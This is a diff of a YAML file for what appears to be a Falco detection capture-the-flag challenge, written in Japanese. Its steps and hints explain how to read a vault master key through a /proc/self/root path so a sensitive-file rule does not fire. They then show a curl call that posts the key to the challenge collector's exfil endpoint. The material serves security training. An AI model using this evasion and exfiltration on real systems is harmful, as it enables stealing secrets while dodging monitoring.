@@ -21,7 +21,7 @@ steps:
       ファイル (/opt/nimbus/vault/master.key) に再利用してみよう。
       同じ回避がそのまま効く。この別経路での読みは禁止ルールを 1 本も踏まない
       一方で、positive-proof ルール (Nimbus Vault Master Key Read) が発火する —
-      この発火は正常で、CLEARED の条件でもある (素朴な cat は逆に禁止ルール側を踏む)。
+      この発火は正常で、CLEARED の条件でもある。読み方によっては発火しないことがある — その場合は読み直す。
   - label: 既存の curl で collector へ静かに送る
     detail: |
       reverse shell (C2) や自前バイナリの drop+実行は禁止ルールに触れる。
@@ -65,7 +65,6 @@ hints:
       # /proc/self/root 経由の別経路で読むので、禁止ルール (Read sensitive file
       # untrusted) は踏まない (03 の技法の再利用)。この読みでは positive-proof ルール
       # Nimbus Vault Master Key Read が発火する — この発火は正常で CLEARED の条件
-      # (素朴な cat は逆に禁止ルール側を踏む)
 
       curl -s "$FALCO_CTF_COLLECTOR/api/challenges/10-final-exfil/exfil" \
         -H 'Content-Type: application/json' \
